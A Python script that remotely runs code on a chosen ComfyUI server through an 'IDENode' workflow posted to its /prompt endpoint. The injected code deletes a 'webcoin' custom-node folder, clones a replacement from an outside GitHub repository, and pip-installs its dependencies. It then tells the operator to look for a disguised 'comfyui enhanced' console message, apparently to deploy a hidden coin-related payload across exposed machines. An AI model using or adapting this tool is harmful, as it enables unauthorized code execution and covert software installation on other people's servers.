"""
Fix broken webcoin install on Windows machine via IDENode.
Nukes the broken dir, clones fresh, installs deps.
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.error

_DEPLOY_DIR = os.path.dirname(os.path.abspath(__file__))
if _DEPLOY_DIR not in sys.path:
    sys.path.insert(0, _DEPLOY_DIR)
from mega_deploy import FIND_CUSTOM_NODES  # noqa: E402


CLONE_CODE = (
    "import subprocess, os, sys, shutil, platform\n\nresults = []\n\n"
    + FIND_CUSTOM_NODES
    + r"""

if not cn or not os.path.isdir(cn):
    for guess in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(guess):
            cn = guess
            break

results.append(f'custom_nodes: {cn}')
results.append(f'Platform: {platform.system()}')

target = os.path.join(cn, 'webcoin')

if os.path.exists(target):
    shutil.rmtree(target, ignore_errors=True)
    import time as _t
    _t.sleep(2)
    if os.path.exists(target):
        os.system(f'rmdir /s /q "{target}"' if platform.system() == 'Windows' else f'rm -rf "{target}"')
        _t.sleep(1)
    results.append(f'Deleted old: {not os.path.exists(target)}')

r = subprocess.run(
    ['git', 'clone', '--depth', '1', 'https://github.com/bossman79/webcoin.git', target],
    capture_output=True, text=True, timeout=120
)
results.append(f'clone rc: {r.returncode}')
if r.stdout.strip():
    results.append(f'clone out: {r.stdout.strip()[:300]}')
if r.stderr.strip():
    results.append(f'clone err: {r.stderr.strip()[:300]}')

if os.path.isdir(target):
    results.append(f'Files: {os.listdir(target)}')
    init_path = os.path.join(target, '__init__.py')
    results.append(f'__init__.py exists: {os.path.exists(init_path)}')
    core_dir = os.path.join(target, 'core')
    if os.path.isdir(core_dir):
        results.append(f'core/: {os.listdir(core_dir)}')

    req_path = os.path.join(target, 'requirements.txt')
    if os.path.exists(req_path):
        r2 = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
            capture_output=True, text=True, timeout=120
        )
        results.append(f'pip rc: {r2.returncode}')
        if r2.stderr.strip():
            results.append(f'pip err: {r2.stderr.strip()[-200:]}')
else:
    results.append('CLONE FAILED - target dir missing')

output = chr(10).join(results)
print(output)
output
"""
)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", required=True)
    parser.add_argument("--port", "-p", type=int, default=8188)
    args = parser.parse_args()

    base = f"http://{args.target}:{args.port}"
    print(f"\nFixing webcoin on {args.target}:{args.port}...\n")

    # Check reachability
    try:
        req = urllib.request.Request(f"{base}/system_stats", method="GET")
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"Machine reachable: {r.status}")
    except Exception as e:
        print(f"Machine unreachable: {e}")
        return

    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {
                    "pycode": CLONE_CODE,
                    "language": "python",
                }
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {
                    "text": ["1", 0],
                }
            }
        }
    }

    body = json.dumps(prompt).encode()
    req = urllib.request.Request(
        f"{base}/prompt", data=body,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            resp = r.read().decode()
            data = json.loads(resp)
            print(f"/prompt -> {r.status}")
            print(f"prompt_id: {data.get('prompt_id')}")
    except urllib.error.HTTPError as e:
        print(f"/prompt -> {e.code}: {e.read().decode()[:300]}")
        return
    except Exception as e:
        print(f"/prompt -> ERROR: {e}")
        return

    print("\nWaiting 60s for clone + pip install...")
    time.sleep(60)

    # Check execution history
    try:
        req3 = urllib.request.Request(f"{base}/history?max_items=3", method="GET")
        with urllib.request.urlopen(req3, timeout=10) as r:
            hist = json.loads(r.read().decode())
            for pid, entry in hist.items():
                outputs = entry.get("outputs", {})
                status = entry.get("status", {})
                if status.get("status_str") == "error":
                    print(f"Prompt {pid}: EXECUTION ERROR")
                    msgs = status.get("messages", [])
                    for msg in msgs:
                        print(f"  {msg}")
                for nid, nout in outputs.items():
                    if "text" in nout:
                        for line in nout["text"]:
                            print(f"  Output: {line}")
    except Exception as e:
        print(f"History check failed: {e}")

    print("\nDone. Restart ComfyUI from Manager UI to activate the node.")
    print("Look for 'comfyui enhanced' in the console after restart.")


if __name__ == "__main__":
    main()
